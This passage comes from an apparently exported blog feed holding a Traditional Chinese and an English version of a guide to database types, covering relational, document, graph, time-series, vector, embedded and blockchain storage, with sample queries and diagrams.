可擴展性：專為分散式系統設計，處理數千台伺服器上的 PB 級資料。 靈活的架構：與文件資料庫類似，列儲存允許在不進行架構遷移的情況下新增列。 劣勢 寫入效能：針對讀取而非寫入進行最佳化。插入或更新資料可能比面向行的資料庫慢。 複雜查詢：涉及許多列或複雜連接的查詢可能效率低下。 學習曲線：不同的資料建模方法需要重新思考如何構建資料。 最佳使用案例 資料倉儲：商業智慧、報告、分析 時間序列資料：IoT 感測器資料、應用程式指標、日誌 事件記錄：使用者活動追蹤、稽核軌跡 推薦引擎：分析使用者行為模式 金融分析：處理大型資料集進行風險分析、詐欺偵測 熱門範例 Apache Cassandra：分散式、高可用性、線性可擴展性 Apache HBase：建立在 Hadoop 上、適合大資料的即時讀寫存取 Google Bigtable：託管服務、支援許多 Google 產品 Amazon Redshift：資料倉儲服務、SQL 介面、列式儲存 🎬 真實世界情境社交媒體平台使用 Cassandra 儲存使用者活動： Column Family: user_activity Row Key: user_id Columns: timestamp1:action1, timestamp2:action2, ... 查詢：「顯示使用者 123 在 2023 年 7 月的所有貼文」 資料庫有效地僅掃描使用者 123 的相關列族，按時間戳記過濾。即使有數百萬使用者的數十億活動，查詢也能在毫秒內返回結果。 graph LR A([📊 分析查詢]) --> B([列儲存]) B --> C([僅讀取需要的列]) C --> D([⚡ 快速聚合]) E([📊 相同查詢]) --> F([行儲存]) F --> G([讀取所有列]) G --> H([🐌 較慢處理]) style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style H fill:#ffebee,stroke:#c62828,stroke-width:2px 圖形資料庫：關聯性優先 圖形資料庫專為關聯性與資料本身同樣重要的資料而設計。它們將資料儲存為節點（實體）和邊（關聯性），使得建模和查詢連接資料變得自然。 運作方式 圖形資料庫不使用表格或文件，而是使用節點來表示實體（人、產品、位置）和邊來表示關聯性（認識、購買、位於）。節點和邊都可以具有屬性。遍歷關聯性非常有效率，因為關聯性是一等公民，而不是需要連接的外鍵。 優勢 關聯性查詢：在資料中尋找連接、路徑和模式是自然且快速的。像「朋友的朋友」或「最短路徑」這樣的查詢簡單且有效率。 靈活的架構：易於新增節點類型和關聯性類型，無需重組現有資料。 效能：無論資料庫大小如何，關聯性遍歷效能都是恆定的，不像關聯式資料庫中的連接會隨著資料增長而變慢。 直觀的建模：圖形結構自然地映射到許多真實世界場景：社交網路、組織層次結構、推薦系統。 劣勢 有限的聚合：不針對聚合大量資料的分析查詢進行最佳化。 擴展挑戰：在多個伺服器之間分配圖形資料很複雜，因為關聯性通常跨越分區。 學習曲線：圖形查詢語言（如 Cypher）與 SQL 不同，需要開發人員學習新概念。 對簡單資料過度：如果您的資料沒有複雜的關聯性，圖形資料庫會增加不必要的複雜性。 最佳使用案例 社交網路：朋友連接、追蹤者關聯性、內容分享 推薦引擎：「購買 X 的客戶也購買了 Y」 詐欺偵測：在交易網路中尋找可疑模式 知識圖譜：維基百科風格的互連資訊 網路拓撲：IT 基礎設施、電信網路 存取控制：複雜的權限層次結構和基於角色的存取 熱門範例 Neo4j：最受歡迎的圖形資料庫、Cypher 查詢語言、優秀的工具 Amazon Neptune：完全託管、支援屬性圖和 RDF 模型 ArangoDB：多模型資料庫，具有強大的圖形功能 JanusGraph：分散式、可擴展、建立在其他儲存後端之上 🎬 真實世界情境社交網路使用 Neo4j 建模使用者關聯性： // 尋找喜歡健行的朋友的朋友 MATCH (me:User &#123;id: 123&#125;)-[:FRIENDS_WITH]-&gt;(friend)-[:FRIENDS_WITH]-&gt;(fof) WHERE (fof)-[:LIKES]-&gt;(:Interest &#123;name: &quot;hiking&quot;&#125;) AND NOT (me)-[:FRIENDS_WITH]-&gt;(fof) RETURN fof.name, COUNT(friend) as mutual_friends ORDER BY mutual_friends DESC LIMIT 10 此查詢有效地遍歷關聯性以尋找朋友推薦。在關聯式資料庫中，這需要多次自連接，速度會慢得多。 graph TB A([👤 Alice]) -->|FRIENDS_WITH| B([👤 Bob]) A -->|FRIENDS_WITH| C([👤 Carol]) B -->|FRIENDS_WITH| D([👤 David]) C -->|FRIENDS_WITH| D D -->|LIKES| E([🏔️ 健行]) B -->|LIKES| F([📚 閱讀]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 時間序列資料庫：針對時間資料最佳化 時間序列資料庫專門用於隨時間變化的資料：指標、事件、感測器讀數。它們針對高效地攝取、儲存和查詢帶時間戳記的資料進行最佳化。 運作方式 資料按時間戳記組織，並針對基於時間的查詢和聚合進行最佳化。時間序列資料庫通常使用特定於時間資料的壓縮技術，實現比通用資料庫好 10-100 倍的壓縮。它們通常包含用於降採樣、插值和時間視窗聚合的內建函數。 優勢 攝取效能：針對帶時間戳記資料的大量寫入進行最佳化，每秒處理數百萬個資料點。 儲存效率：專門的壓縮演算法大幅減少時間序列資料的儲存需求。 基於時間的查詢：用於時間視窗、聚合和時間分析的內建函數使複雜查詢變得簡單。 保留政策：自動資料生命週期管理，根據年齡降採樣舊資料或刪除它。 劣勢 有限的使用案例：僅適用於時間序列資料；不是通用資料庫。 更新複雜性：針對僅附加工作負載進行最佳化；更新歷史資料可能效率低下。 查詢限制：不是為不同資料類型之間的複雜連接或關聯性而設計的。 最佳使用案例 應用程式監控：效能指標、錯誤率、資源利用率 IoT 感測器資料：溫度、壓力、位置追蹤 金融資料：股票價格、交易量、市場資料 DevOps：基礎設施監控、日誌聚合 工業系統：製造指標、設備遙測 熱門範例 InfluxDB：專為時間序列打造、類 SQL 查詢語言 TimescaleDB：PostgreSQL 擴充、結合關聯式和時間序列功能 Prometheus：專注於監控、基於拉取的指標收集 Amazon Timestream：完全託管、無伺服器時間序列資料庫 🎬 真實世界情境IoT 平台使用 InfluxDB 儲存感測器資料： Measurement: temperature Tags: sensor_id&#x3D;sensor1, location&#x3D;warehouse_a Fields: value&#x3D;22.5 Timestamp: 2023-07-15T14:30:00Z 查詢：「過去 7 天每小時的平均溫度」 SELECT MEAN(value) FROM temperature WHERE location&#x3D;&#39;warehouse_a&#39; AND time &gt; now() - 7d GROUP BY time(1h) 資料庫有效地聚合數百萬個資料點，在毫秒內返回結果。 向量資料庫：AI 的相似性搜尋 向量資料庫是專門設計用於儲存和查詢高維向量的系統 - 文字、圖像或音訊等資料的數值表示。它們已成為 AI 應用程式的必備工具，特別是那些使用機器學習嵌入的應用程式。 運作方式 向量資料庫不儲存傳統資料類型，而是儲存表示資料語義意義的向量（數字陣列）。當您搜尋時，資料庫使用餘弦相似度或歐幾里得距離等數學距離度量來尋找「接近」您查詢向量的向量。這實現了語義搜尋 - 根據意義而非精確匹配來尋找相似項目。 範例：句子「狗在公園玩耍」可能表示為 1536 維向量，如 [0.23, -0.45, 0.67, …]。類似的句子如「小狗在戶外奔跑」在數學空間中會有接近的向量。 優勢 語義搜尋：根據意義而非關鍵字尋找相似項目。搜尋「快樂的狗」並找到「快樂的小狗」，即使它們沒有共同的詞。 AI 整合：原生支援來自 OpenAI、BERT 或自訂神經網路等模型的機器學習嵌入。 快速相似性搜尋：最佳化的演算法（ANN - 近似最近鄰）在毫秒內找到相似向量，即使有數十億個向量。 多模態支援：在同一向量空間中儲存和搜尋不同的資料類型 - 文字、圖像、音訊。 劣勢 專業化使用案例：僅在需要相似性搜尋時有用；對於傳統查詢來說過度。 嵌入依賴性：需要外部模型來生成向量；品質取決於嵌入模型。 儲存需求：高維向量消耗大量儲存空間，特別是在大規模時。 近似結果：大多數使用近似演算法以提高速度，犧牲完美準確性以換取效能。 最佳使用案例 語義搜尋：文件搜尋、知識庫、問答系統 推薦引擎：相似產品、內容推薦 圖像搜尋：尋找相似圖像、反向圖像搜尋 聊天機器人和 RAG：AI 助理的檢索增強生成 異常偵測：在高維資料中尋找異常值 重複偵測：尋找相似或重複的內容 熱門範例 Pinecone：完全託管、針對生產 AI 應用程式最佳化 Weaviate：開源、內建向量化、GraphQL API Milvus：開源、高效能、支援多種索引 Qdrant：基於 Rust、過濾功能、有效負載儲存 pgvector：PostgreSQL 擴充、結合關聯式和向量搜尋 🎬 真實世界情境客戶支援聊天機器人使用 Pinecone 進行知識檢索： 索引：使用 OpenAI 嵌入將 10,000 篇支援文章轉換為向量 使用者查詢：「如何重設密碼？」 向量搜尋：將查詢轉換為向量，找到 5 個最相似的文章向量 回應：AI 使用檢索到的文章作為上下文生成答案 系統即使使用者以不同方式表達問題也能找到相關文章： 「忘記密碼」→ 找到密碼重設文章 「無法登入」→ 找到身份驗證疑難排解 「帳戶鎖定」→ 找到帳戶恢復程序 傳統關鍵字搜尋會錯過這些語義連接。 graph TB A([📝 使用者查詢「如何重設密碼？」]) --> B([🔢 轉換為向量[0.23, -0.45, ...]]) B --> C([🔍 向量資料庫尋找相似向量]) D([📚 知識庫文章作為向量]) --> C C --> E([📄 前 5 個相似文章檢索]) E --> F([🤖 AI 生成上下文答案]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 嵌入式資料庫：輕量且自包含 嵌入式資料庫是在應用程式內執行的輕量級資料庫引擎，而不是作為獨立的伺服器程序。它們非常適合行動應用程式、桌面應用程式和邊緣裝置，其中簡單性和最小資源使用是優先考慮的。 運作方式 與客戶端-伺服器資料庫不同，嵌入式資料庫在與您的應用程式相同的程序中執行。整個資料庫通常是儲存在裝置本地的單一檔案。沒有網路通訊、沒有獨立的資料庫伺服器、沒有複雜的設定 - 只需包含程式庫並開始儲存資料。 優勢 零配置：不需要伺服器安裝或設定。只需在應用程式中包含程式庫並開始使用。 輕量級：最小的記憶體佔用和磁碟空間需求，非常適合資源受限的裝置。 離線優先：無需網路連接即可工作，非常適合需要離線功能的行動應用程式。 快速效能：沒有網路延遲，因為資料庫在程序內執行。查詢在微秒內執行。 可攜性：資料庫檔案可以輕鬆複製、備份或在裝置之間傳輸。 劣勢 單一應用程式存取：一次只有一個應用程式可以存取資料庫（儘管有些支援唯讀並發存取）。 有限的可擴展性：不是為高並發或大規模部署而設計的。 沒有遠端存取：沒有額外的基礎設施，無法從另一台機器查詢資料庫。 功能限制：與完整的資料庫伺服器相比功能較少（沒有預存程序、有限的使用者管理）。 最佳使用案例 行動應用程式：iOS 和 Android 應用程式在本地儲存使用者資料 桌面應用程式：配置、快取和使用者資料儲存 IoT 和邊緣裝置：在資源受限的硬體上收集感測器資料 瀏覽器應用程式：網路應用程式中的客戶端資料儲存 測試和開發：無需資料庫伺服器設定即可快速原型製作 嵌入式系統：汽車、醫療裝置、工業設備 熱門範例 SQLite：部署最廣泛的資料庫，用於數十億台裝置（iOS、Android、瀏覽器） Microsoft Access：具有 GUI 的桌面資料庫，適合小型企業應用程式和原型製作 Realm：行動優先資料庫，具有即時同步，適合 iOS 和 Android LevelDB：嵌入在 Chrome 和許多應用程式中的鍵值儲存 Berkeley DB：用於 C/C++ 應用程式的高效能嵌入式資料庫 EdgeDB（IoT）：輕量級，專為邊緣運算和資源有限的 IoT 裝置設計 RocksDB：針對快速儲存最佳化的嵌入式鍵值儲存，用於 IoT 閘道 📊 Microsoft Access：桌面資料庫Microsoft Access 介於嵌入式和客戶端-伺服器資料庫之間： 優勢： 無需程式碼即可建立表格、表單和報告的視覺化介面 與 Microsoft Office 生態系統整合 適合小型團隊（&lt; 10 個並發使用者） 快速原型製作和小型企業應用程式 限制： 僅限 Windows，需要 Microsoft Office 授權 可擴展性差 - 2GB 檔案大小限制，多使用者時效能下降 不適合網路應用程式或行動應用程式 有限的安全性和備份功能 **何時使用：**小型企業資料庫、部門應用程式、稍後將遷移到適當資料庫的快速原型。對於嚴肅的應用程式，請改用 PostgreSQL 或 MySQL。 🎬 真實世界情境行動健身應用程式使用 SQLite 儲存鍛鍊資料： -- 應用程式首次啟動時建立表格 CREATE TABLE workouts ( id INTEGER PRIMARY KEY, date TEXT, type TEXT, duration INTEGER, calories INTEGER ); -- 在本地儲存鍛鍊資料 INSERT INTO workouts VALUES (1, &#39;2023-07-15&#39;, &#39;Running&#39;, 30, 250); -- 查詢鍛鍊歷史 SELECT * FROM workouts WHERE date &gt;&#x3D; date(&#39;now&#39;, &#39;-7 days&#39;) ORDER BY date DESC; **好處：** - 離線工作 - 使用者可以在沒有網際網路的情況下記錄鍛鍊 - 快速 - 查詢在裝置上立即執行 - 私密 - 資料保留在使用者的裝置上 - 簡單 - 基本功能不需要後端伺服器 - 稍後同步 - 可在連接可用時上傳到雲端 graph TB A([📱 行動應用程式]) --> B([SQLite 資料庫本地檔案]) B --> C([離線存取不需要網路]) C --> D({網際網路可用？}) D -->|是| E([☁️ 同步到雲端可選]) D -->|否| F([✅ 繼續工作離線]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px 💡 SQLite：世界上部署最廣泛的資料庫SQLite 可能是世界上使用最廣泛的資料庫： 每台 Android 裝置都內建 SQLite 每台 iOS 裝置都使用 SQLite 儲存系統資料 所有主要網路瀏覽器都使用 SQLite 估計有 1+ 兆個 SQLite 資料庫在使用中 公有領域 - 完全免費，無需授權 單一 C 檔案 - 整個資料庫引擎約 150KB 如果您今天使用過智慧型手機，您就使用過 SQLite。 搜尋引擎：全文搜尋與分析 像 Elasticsearch 這樣的搜尋引擎是專門針對全文搜尋、日誌分析和即時分析最佳化的資料庫。雖然不是傳統資料庫，但它們是現代資料架構的重要組成部分。 運作方式 資料使用倒排索引進行索引，將詞映射到包含它們的文件。這使得文字搜尋非常快。搜尋引擎還支援具有相關性評分、模糊匹配和分面搜尋的複雜查詢。 優勢 全文搜尋：在大型文字資料集中進行快速、相關的搜尋，具有詞幹提取、同義詞和拼寫錯誤容忍等功能。 即時分析：以亞秒級回應時間即時聚合和分析資料。 可擴展性：分散式架構處理跨叢集的 PB 級資料。 靈活性：具有動態映射的無架構 JSON 文件。 劣勢 不符合 ACID：最終一致性模型；不適合交易資料。 資源密集：索引和查詢需要大量記憶體和 CPU。 複雜性：叢集管理、調整和最佳化需要專業知識。 最佳使用案例 網站搜尋：電子商務產品搜尋、內容搜尋 日誌分析：應用程式日誌、安全日誌、稽核軌跡 商業分析：即時儀表板、指標視覺化 推薦系統：基於使用者行為的內容發現 熱門範例 Elasticsearch：最受歡迎、豐富的生態系統、強大的分析 Apache Solr：成熟、功能豐富、適合企業搜尋 Amazon OpenSearch：託管的 Elasticsearch 相容服務 選擇正確的資料庫：決策框架 有這麼多資料庫類型，您如何選擇？這裡有一個實用的框架： 步驟 1：了解您的資料 結構：您的資料是高度結構化的（關聯式）、半結構化的（文件）還是非結構化的（鍵值）？ 關聯性：資料之間的關聯性重要嗎？它們有多複雜？ 架構穩定性：您的資料結構會經常變化，還是穩定的？ 步驟 2：分析您的存取模式 讀取與寫入：您的工作負載是讀取密集型、寫入密集型還是平衡的？ 查詢複雜性：您需要具有連接和聚合的複雜查詢，還是簡單的查找？ 即時需求：您需要即時一致性，還是最終一致性可以接受？ 步驟 3：考慮規模和效能 資料量：您將儲存多少資料？GB、TB、PB？ 流量：每秒多少請求？是否有流量高峰？ 延遲需求：您需要什麼回應時間？毫秒還是秒？ 步驟 4：評估營運需求 團隊專業知識：您的團隊了解哪些資料庫？ 營運複雜性：您能管理分散式系統，還是需要託管服務？ 成本：您的授權、基礎設施和營運預算是多少？ 步驟 5：思考未來 成長：您的資料和流量將如何成長？ 演進：您的需求可能如何變化？ 供應商鎖定：如果需要，遷移有多容易？ 🎯 快速決策指南 具有複雜關聯性的結構化資料 → 關聯式（PostgreSQL、MySQL） 靈活架構、面向文件 → 文件（MongoDB、Couchbase） 簡單、快速查找 → 鍵值（Redis、DynamoDB） 大型資料集上的分析 → 列族（Cassandra、Redshift） 連接資料、關聯性查詢 → 圖形（Neo4j、Neptune） 帶時間戳記的指標和事件 → 時間序列（InfluxDB、TimescaleDB） 語義相似性搜尋、AI 應用程式 → 向量（Pinecone、Weaviate） 行動應用程式、離線優先、嵌入式系統 → 嵌入式（SQLite、Realm） 全文搜尋 → 搜尋引擎（Elasticsearch、Solr） 多語言持久化：使用多個資料庫 現代應用程式通常使用多種資料庫類型，每種都處理最適合它的工作負載。這種方法稱為多語言持久化，可最大化效能和效率。 範例架構 電子商務平台可能使用： PostgreSQL：訂單處理、庫存、客戶帳戶（ACID 交易） MongoDB：產品目錄（產品屬性各異的靈活架構） Redis：會話管理、購物車（快速存取、臨時資料） Elasticsearch：產品搜尋（具有相關性排名的全文搜尋） Neo4j：產品推薦（基於關聯性的建議） InfluxDB：應用程式指標（時間序列監控資料） graph TB A([🛒 電子商務應用程式]) --> B([PostgreSQL訂單與庫存]) A --> C([MongoDB產品目錄]) A --> D([Redis會話與快取]) A --> E([Elasticsearch產品搜尋]) A --> F([Neo4j推薦]) A --> G([InfluxDB指標]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#ffebee,stroke:#c62828,stroke-width:2px style E fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px style F fill:#e0f2f1,stroke:#00796b,stroke-width:2px style G fill:#fce4ec,stroke:#c2185b,stroke-width:2px 好處 最佳化效能：每個資料庫處理它最擅長的事情，最大化整體系統效能。 靈活性：為每項工作選擇正確的工具，而不是將所有內容強制放入一個資料庫。 可擴展性：根據特定需求獨立擴展系統的不同部分。 挑戰 複雜性：管理多個資料庫增加了營運開銷。 資料一致性：在資料庫之間保持資料同步需要仔細設計。 學習曲線：團隊需要多種資料庫技術的專業知識。 成本：更多資料庫意味著更多基礎設施和授權成本。 ⚠️ 何時避免多語言持久化不要僅僅因為可以就使用多個資料庫。從簡單開始： 小型應用程式：一個資料庫通常就足夠了 有限的團隊：堅持您的團隊熟悉的 緊張的預算：多個資料庫增加成本 簡單的需求：不要過度工程化 只有在您有明確的效能或功能需求而當前資料庫無法滿足時，才新增資料庫。 區塊鏈：作為資料庫的分散式帳本 區塊鏈可以被視為一種專業化的資料庫類型，但具有使其與傳統資料庫根本不同的獨特特徵。它是一個專為無需信任、防篡改記錄保存而設計的分散式帳本。 運作方式 區塊鏈將資料儲存在以密碼學方式連結在一起的區塊中。每個區塊包含交易、時間戳記和前一個區塊的雜湊值。資料庫在網路中的多個節點上複製，共識機制確保所有節點在沒有中央權威的情況下就當前狀態達成一致。 優勢 不可變性：一旦資料寫入區塊鏈，就無法更改或刪除。這創造了所有交易的可稽核歷史。 去中心化：沒有單一的控制點或故障點。資料庫分散在許多節點上，使其高度彈性。 透明性：所有參與者都可以驗證交易和資料完整性。整個歷史是可見和可稽核的。 無需權威的信任：密碼學證明和共識機制使各方能夠在不信任中央權威的情況下進行交易。 劣勢 極其緩慢：共識機制使寫入比傳統資料庫慢幾個數量級。比特幣每秒處理約 7 筆交易，而傳統資料庫可處理數千筆。 儲存效率低：每個節點都儲存整個區塊鏈，導致大量儲存冗餘。比特幣的區塊鏈超過 500GB。 沒有更新或刪除：僅附加結構意味著您無法修改或移除資料，只能新增記錄。 高能源成本：工作量證明共識（如比特幣）消耗大量電力。 有限的查詢功能：沒有複雜的查詢、連接或聚合。主要是按交易 ID 或區塊編號進行鍵值查找。 最佳使用案例 加密貨幣：比特幣、以太坊和其他數位貨幣 供應鏈追蹤：產品來源的不可變記錄 智能合約：區塊鏈平台上的自執行協議 數位身份：去中心化身份驗證 稽核軌跡：合規和監管要求的防篡改日誌 熱門範例 Bitcoin：第一個區塊鏈、加密貨幣交易 Ethereum：智能合約平台、可程式化區塊鏈 Hyperledger Fabric：私有網路的企業區塊鏈 Corda：金融服務的區塊鏈 ⚠️ 區塊鏈與傳統資料庫使用區塊鏈的時機： 多方需要在不互相信任的情況下共享資料 不可變性和稽核軌跡至關重要 去中心化比效能更重要 使用傳統資料庫的時機： 您需要快速讀寫（幾乎總是） 您需要更新或刪除資料 您需要複雜的查詢和分析 單一組織控制資料 效能和成本很重要 現實檢查：99% 的應用程式不需要區塊鏈。傳統資料庫更快、更便宜、更靈活。只有在去中心化和不可變性是絕對要求時才使用區塊鏈。 graph LR A([📝 新交易]) --> B([建立區塊]) B --> C([廣播到網路]) C --> D([節點驗證]) D --> E({達成共識？}) E -->|是| F([區塊新增到鏈]) E -->|否| G([交易被拒絕]) F --> H([不可變記錄]) style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e3f2fd,stroke:#1976d2,stroke-width:2px 新興趨勢與未來方向 資料庫領域持續演進。以下是塑造未來的趨勢： 多模型資料庫 在一個系統中支援多種資料模型（文件、圖形、鍵值）的資料庫，減少對多語言持久化的需求。範例：ArangoDB、CosmosDB。 無伺服器資料庫 按使用付費的資料庫，在不使用時自動縮放到零，消除基礎設施管理。範例：Amazon Aurora Serverless、Azure Cosmos DB。 雲原生資料庫 專為雲端環境設計的資料庫，具有內建的分散、複製和跨多個區域的擴展。與為雲端改編的傳統資料庫不同，這些是從頭開始為分散式雲端基礎設施建構的。 關鍵功能： 自動擴展和自我修復 具有強一致性的多區域複製 按使用付費定價模型 Kubernetes 原生部署 內建高可用性和災難恢復 範例： Google Spanner：全球分散式、水平可擴展、強一致性 CockroachDB：PostgreSQL 相容、可承受資料中心故障、開源 YugabyteDB：多雲、PostgreSQL 相容、分散式 SQL Amazon Aurora：MySQL/PostgreSQL 相容、5 倍效能提升 Azure Cosmos DB：多模型、全球分散式、99.999% 可用性 SLA NewSQL 資料庫 結合 NoSQL 的可擴展性與關聯式資料庫的 ACID 保證。範例：Google Spanner、CockroachDB、VoltDB。 AI 最佳化資料庫 具有內建機器學習功能的資料庫，用於自動調整、查詢最佳化和異常偵測。 結論：為工作選擇正確的工具 資料庫類型的爆炸性增長不是要取代關聯式資料庫 - 而是要擴展我們的工具箱。每種資料庫類型都比通用解決方案更好地解決特定問題。理解這些差異使您能夠做出明智的決策，提高效能、降低成本並簡化開發。 關鍵不是記住每個資料庫功能 - 而是理解基本權衡：一致性與可用性、靈活性與結構、簡單性與功能。有了這些知識，您可以評估新出現的資料庫並為每項工作選擇正確的工具。 從簡單開始。使用您知道的。但當您遇到限制 - 查詢緩慢、擴展挑戰或尷尬的資料建模 - 請記住，專業化資料庫的存在就是為了解決這些確切的問題。資料庫領域豐富多樣是有原因的：不同的問題需要不同的解決方案。 💭 最後的想法「沒有一體適用的資料庫。最好的資料庫是適合您特定使用案例、團隊專業知識和營運能力的資料庫。」 明智地選擇，但不要過度思考。隨著需求的增長，您總是可以演進您的架構。 額外資源 學習資源： Database Fundamentals - 資料庫概念的綜合課程 SQL Tutorial - 互動式 SQL 學習 NoSQL Distilled - Martin Fowler 關於 NoSQL 資料庫的書 資料庫文件： PostgreSQL Documentation MongoDB Manual Redis Documentation Neo4j Documentation 比較工具： DB-Engines Ranking - 資料庫受歡迎程度和趨勢 Database of Databases - 綜合資料庫目錄","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Database","slug":"Database","permalink":"https://neo01.com/tags/Database/"},{"name":"SQL","slug":"SQL","permalink":"https://neo01.com/tags/SQL/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://neo01.com/tags/NoSQL/"},{"name":"Data Storage","slug":"Data-Storage","permalink":"https://neo01.com/tags/Data-Storage/"}],"lang":"zh-TW"},{"title":"Understanding Database Types: A Comprehensive Guide","slug":"2023/07/Understanding_Database_Types_A_Comprehensive_Guide","date":"un44fin44","updated":"un55fin55","comments":true,"path":"2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","permalink":"https://neo01.com/2023/07/Understanding_Database_Types_A_Comprehensive_Guide/","excerpt":"From relational to graph databases - explore the diverse world of data storage systems and learn which database type fits your application's needs.","text":"Remember the first time you needed to store data for your application? You probably reached for whatever database you’d heard of - maybe MySQL or PostgreSQL - without thinking much about whether it was the right choice. It worked, so you moved on. But as your application grew, you might have hit walls: slow queries, scaling challenges, or data structures that just didn’t fit the relational model. Here’s the thing: databases aren’t one-size-fits-all. The database landscape has exploded over the past two decades, evolving from the dominance of relational databases to a rich ecosystem of specialized storage systems. Each type is optimized for specific use cases, data patterns, and performance requirements. Choosing the wrong database is like using a hammer when you need a screwdriver - it might work, but you’ll struggle unnecessarily. Understanding the different types of databases and their strengths helps you make informed decisions that save time, money, and headaches down the road. 💡 What is a Database?A database is an organized collection of structured information or data, typically stored electronically in a computer system. A database management system (DBMS) controls the database, allowing users to create, read, update, and delete data efficiently and securely. The Database Evolution: From Files to Specialized Systems Before diving into specific database types, let’s understand how we got here. In the early days of computing, applications stored data in flat files - simple text files with records separated by delimiters. This worked for small datasets but quickly became unmanageable as data grew. The relational database revolution of the 1970s changed everything. Edgar F. Codd’s relational model introduced structured tables with relationships, enabling complex queries through SQL (Structured Query Language). For decades, relational databases like Oracle, MySQL, and PostgreSQL dominated the landscape, and for good reason - they provided consistency, reliability, and powerful query capabilities. But the internet era brought new challenges. Web applications needed to handle massive scale, unpredictable traffic spikes, and diverse data types that didn’t fit neatly into tables. This sparked the NoSQL movement in the 2000s, introducing databases optimized for specific use cases: document stores for flexible schemas, key-value stores for speed, column stores for analytics, and graph databases for connected data. Today, we live in a polyglot persistence world where applications use multiple database types, each handling the workload it’s best suited for. Your e-commerce site might use a relational database for transactions, a document store for product catalogs, a cache for session data, and a graph database for recommendations. timeline title Evolution of Database Systems 1970s : Relational Databases : SQL and ACID transactions : Oracle, IBM DB2 1980s-1990s : Maturity & Dominance : MySQL, PostgreSQL : Enterprise adoption 2000s : NoSQL Movement : Web-scale challenges : MongoDB, Cassandra, Redis 2010s : Specialized Systems : Graph, Time-series, NewSQL : Polyglot persistence 2020s : Cloud-Native & Distributed : Serverless databases : Multi-model systems Relational Databases (RDBMS): The Foundation Relational databases organize data into tables (relations) with rows and columns. Each table has a defined schema specifying column names and data types. Tables can be linked through foreign keys, creating relationships between data. How They Work Data is stored in tables with strict schemas. When you query data, the database engine uses SQL to join tables, filter rows, and aggregate results. Relational databases enforce ACID properties (Atomicity, Consistency, Isolation, Durability) to ensure data integrity, making them ideal for applications where correctness is critical. ACID Properties Explained: Atomicity: Transactions are all-or-nothing; if one part fails, the entire transaction rolls back Consistency: Data must meet all validation rules and constraints Isolation: Concurrent transactions don’t interfere with each other Durability: Once committed, data persists even if the system crashes Strengths Data Integrity: Foreign keys, constraints, and transactions ensure data remains consistent and valid. You can’t accidentally create orphaned records or violate business rules. Complex Queries: SQL provides powerful capabilities for joining multiple tables, aggregating data, and performing complex analytical queries. Need to find all customers who bought product X but not product Y in the last month? SQL handles this elegantly. Mature Ecosystem: Decades of development have produced robust tools for backup, replication, monitoring, and optimization. The knowledge base is extensive, and skilled developers are plentiful. Standardization: SQL is standardized across databases, making it easier to switch vendors or use multiple systems with similar query languages. Weaknesses Rigid Schema: Changing table structures in production can be complex and risky, especially with large datasets. Adding a column might require downtime or lengthy migrations. Scaling Challenges: Horizontal scaling (adding more servers) is difficult because maintaining ACID properties across distributed systems is complex. Most relational databases scale vertically (bigger servers) which has limits. Performance Overhead: ACID guarantees and complex query optimization add overhead. For simple key-value lookups, relational databases are overkill. Best Use Cases Financial systems: Banking, accounting, payment processing where data integrity is paramount E-commerce transactions: Order processing, inventory management, customer accounts Enterprise applications: ERP, CRM systems with complex relationships between entities Content management: Systems with structured content and relationships Popular Examples PostgreSQL: Open-source, feature-rich, excellent for complex queries and JSON support MySQL: Widely used, simple to set up, good for web applications Oracle Database: Enterprise-grade, powerful features, high cost Microsoft SQL Server: Windows ecosystem integration, strong business intelligence tools IBM DB2: Enterprise database, strong on mainframes, excellent for large-scale transactional systems 🎬 Real-World ScenarioAn online bookstore uses PostgreSQL for its core operations: Customers table: User accounts, addresses, payment methods Books table: ISBN, title, author, price, inventory Orders table: Order details, status, timestamps Order_items table: Links orders to books with quantities When a customer places an order, a transaction ensures: Inventory is decremented Order record is created Payment is processed If any step fails, everything rolls back - no partial orders or inventory discrepancies. graph TB A([👤 Customers]) --> B([📦 Orders]) C([📚 Books]) --> D([📋 Order Items]) B --> D D --> C style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px Document Databases: Flexible and Schema-Free Document databases store data as documents, typically in JSON or BSON format. Unlike relational databases with rigid schemas, document databases allow each document to have different fields, providing flexibility for evolving data structures. How They Work Each document is a self-contained unit containing all related data. Instead of spreading customer information across multiple tables, a document database stores everything in one document: customer details, addresses, order history, and preferences. Documents are organized into collections (similar to tables) and can be queried using document-specific query languages. Strengths Schema Flexibility: Add new fields without migrations. Different documents in the same collection can have different structures, perfect for evolving applications. Natural Data Modeling: Documents map naturally to objects in programming languages. Your application’s data structure can be stored directly without complex object-relational mapping. Performance: Retrieving a document gets all related data in one operation, avoiding expensive joins. This makes read operations fast. Horizontal Scaling: Most document databases are designed for distributed systems, making it easier to scale across multiple servers. Weaknesses Data Duplication: Denormalized data means the same information might be stored in multiple documents, increasing storage requirements and update complexity. Limited Transactions: While modern document databases support transactions, they’re often limited compared to relational databases, especially across multiple documents or collections. Query Complexity: Complex queries involving multiple collections can be challenging and less efficient than SQL joins. Consistency Trade-offs: Many document databases prioritize availability and partition tolerance over immediate consistency (eventual consistency model). Best Use Cases Content management: Blogs, news sites where content structure varies User profiles: Social networks, gaming platforms with diverse user data Product catalogs: E-commerce with varying product attributes Real-time analytics: Event logging, user behavior tracking Mobile applications: 